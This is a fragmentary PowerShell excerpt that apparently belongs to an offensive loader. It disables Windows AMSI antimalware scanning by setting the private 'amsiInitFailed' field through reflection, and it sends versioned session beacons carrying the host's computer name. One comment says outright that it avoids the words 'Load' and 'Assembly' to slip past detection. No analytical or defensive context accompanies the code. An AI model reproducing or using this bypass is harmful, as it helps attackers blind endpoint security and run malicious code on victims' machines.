...
$f = 'amsiInitFailed'
[Ref].Assembly.GetType($n).GetField($f,'NonPublic,Static').SetValue($null,$true)
...
Send-Log -m "INIT_SESSION_V32_2_$($env:COMPUTERNAME)"
...
try {
    ...
    # Using 'Reflection' without using the word 'Load' or 'Assembly'
    ...
    Send-Log -m "SESSION_ACTIVE_V32_2"
} catch {
    Send-Log -m "FAIL_V32_2: $($_.Exception.Message)"
}
